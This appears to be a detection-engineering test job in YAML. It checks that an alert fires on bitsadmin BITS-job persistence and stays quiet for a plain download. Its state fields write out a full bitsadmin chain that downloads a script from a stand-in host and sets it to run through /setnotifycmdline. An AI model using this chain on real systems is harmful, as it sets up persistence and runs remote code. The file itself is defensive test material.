@@ -1,0 +1,74 @@
+type: job
+description: |
+  Validates detection of BITS job persistence set up with the native
+  bitsadmin.exe utility from a command prompt. Two attack workloads
+  emit Sysmon EID 1 process-create events for the job-management verbs the
+  detection enumerates -- /setnotifycmdline (arms an attacker program to run
+  on job state change, the persistence primitive) and /create (starts the
+  job) -- and both must fire. A benign control runs bitsadmin with a plain
+  /transfer download, which uses none of those verbs, and must not fire.
+mitre:
+  tactics: [persistence, defense-evasion]
+  techniques: [T1197]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  username:            gen.username()
+  user:                "${ref.domain_short}\\${ref.username}"
+  bits_job:            WinUpdate
+  payload_url:         "https://updates.example.net/pkg/update.ps1"
+  temp_dir:            "C:\\Users\\${ref.username}\\AppData\\Local\\Temp"
+
+  # full bitsadmin sequence the create + setnotifycmdline children are spawned from
+  chain_parent: '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /create WinUpdate & bitsadmin.exe /addfile WinUpdate https://updates.example.net/pkg/update.ps1 %temp%\update.ps1 & bitsadmin.exe /setnotifycmdline WinUpdate C:\Windows\system32\cmd.exe /c %temp%\update.ps1 & bitsadmin.exe /resume WinUpdate & timeout 5 & bitsadmin.exe /complete WinUpdate"'
+
+  notify_command_line:  "bitsadmin.exe  /setnotifycmdline ${ref.bits_job} C:\\Windows\\System32\\cmd.exe \"/c ${ref.temp_dir}\\update.ps1\""
+  create_command_line:  "bitsadmin.exe  /create ${ref.bits_job}"
+
+  # plain download: not a job-management verb the detection lists
+  transfer_command_line:  "bitsadmin.exe  /transfer /Download /priority Foreground ${ref.payload_url} ${ref.temp_dir}\\update.ps1"
+  transfer_parent:        '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground https://updates.example.net/pkg/update.ps1 %temp%\update.ps1"'
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-job-persistence
+    bindings:
+      domain_short:        ref.domain_short
+      domain_tld:          ref.domain_tld
+      computer:            ref.computer
+      username:            ref.username
+      user:                ref.user
+      command_line:        ref.notify_command_line
+      parent_command_line: ref.chain_parent
+    expectation:
+      expected: alert
+      summary: "bitsadmin /setnotifycmdline arms a notify program on a BITS job -- the persistence primitive fires the detection"
+
+  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-job-persistence
+    bindings:
+      domain_short:        ref.domain_short
+      domain_tld:          ref.domain_tld
+      computer:            ref.computer
+      username:            ref.username
+      user:                ref.user
+      command_line:        ref.create_command_line
+      parent_command_line: ref.chain_parent
+    expectation:
+      expected: alert
+      summary: "bitsadmin /create starts a BITS job from a command prompt and fires the detection"
+
+  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-job-persistence
+    bindings:
+      domain_short:        ref.domain_short
+      domain_tld:          ref.domain_tld
+      computer:            ref.computer
+      username:            ref.username
+      user:                ref.user
+      command_line:        ref.transfer_command_line
+      parent_command_line: ref.transfer_parent
+    expectation:
+      expected: none
+      summary: "A plain bitsadmin /transfer download uses no job-management verb the detection enumerates, so it must not fire"
